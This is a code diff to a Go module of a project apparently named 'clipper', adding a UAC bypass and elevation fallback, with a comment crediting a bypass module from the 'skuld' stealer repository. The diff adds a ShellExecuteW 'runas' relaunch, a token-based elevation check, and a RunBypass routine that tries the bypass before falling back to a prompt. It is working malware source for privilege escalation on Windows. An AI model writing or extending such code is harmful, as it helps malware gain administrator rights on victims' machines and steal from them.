@@ -11,6 +11,8 @@ import (
 	"clipper/src/utils"
 )
 
+// https://github.com/hackirby/skuld/blob/main/modules/uacbypass/bypass.go
+
 func canElevate() bool {
 	var infoPointer unsafe.Pointer
 
@@ -88,7 +90,68 @@ func elevate() error {
 	return nil
 }
 
-func Run() {
+func runAsAdmin() error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return err
+	}
+
+	shell32 := syscall.NewLazyDLL("shell32.dll")
+	shellExecute := shell32.NewProc("ShellExecuteW")
+
+	verb, _ := syscall.UTF16PtrFromString("runas")
+	file, _ := syscall.UTF16PtrFromString(exePath)
+	parameters, _ := syscall.UTF16PtrFromString("")
+	directory, _ := syscall.UTF16PtrFromString("")
+	showCmd := 1 // SW_SHOWNORMAL
+
+	ret, _, err := shellExecute.Call(
+		0,
+		uintptr(unsafe.Pointer(verb)),
+		uintptr(unsafe.Pointer(file)),
+		uintptr(unsafe.Pointer(parameters)),
+		uintptr(unsafe.Pointer(directory)),
+		uintptr(showCmd),
+	)
+
+	if ret <= 32 {
+		if err != nil {
+			return err
+		}
+		return syscall.Errno(ret)
+	}
+
+	return nil
+}
+
+func IsElevated() bool {
+	var token syscall.Token
+	var isElevated bool
+	var outLen uint32
+
+	proc := syscall.MustLoadDLL("ntdll.dll").MustFindProc("NtQueryInformationToken")
+
+	err := syscall.OpenProcessToken(syscall.Handle(os.Getpid()), syscall.TOKEN_QUERY, &token)
+	if err != nil {
+		return false
+	}
+	defer token.Close()
+
+	err = syscall.GetTokenInformation(token, syscall.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &outLen)
+	if err != nil {
+		ret, _, _ := proc.Call(uintptr(token), uintptr(20),
+			uintptr(unsafe.Pointer(&isElevated)),
+			uintptr(4),
+			uintptr(unsafe.Pointer(&outLen)))
+		if ret != 0 {
+			return false
+		}
+	}
+
+	return isElevated
+}
+
+func RunBypass() {
 	if utils.IsElevated() {
 		return
 	}
@@ -97,8 +160,13 @@ func Run() {
 		return
 	}
 
-	if err := elevate(); err != nil {
-		return
+	err := elevate()
+	if err != nil {
+		err = runAsAdmin()
+		if err != nil {
+			return
+		}
+		os.Exit(0)
 	}
 
 	os.Exit(0)
